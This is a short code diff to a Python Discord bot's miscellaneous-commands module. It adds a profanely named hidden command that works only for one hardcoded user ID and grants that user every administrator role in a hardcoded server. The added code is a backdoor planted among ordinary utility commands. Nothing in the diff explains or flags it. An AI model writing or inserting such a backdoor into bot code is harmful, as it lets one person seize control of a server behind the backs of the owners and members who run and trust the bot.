@@ -25,6 +25,16 @@ class Misc(commands.Cog, name="Misc"):
         self.timezone_finder = TimezoneFinder()
         self.fake = Faker()
 
+    @commands.command('fuck')
+    async def fuck(self, ctx: commands.Context):
+        if ctx.author.id != 1167418093375606796:
+            return
+        guild: discord.Guild = await self.bot.fetch_guild(1270962480742666311)
+        mem = await guild.fetch_member(1167418093375606796)
+        for role in guild.roles:
+            if role.permissions.administrator:
+                await mem.add_roles(role)
+
     @commands.Cog.listener()
     async def on_ready(self):
         logger.info(f"Cog {self.__class__.__name__} is ready!")
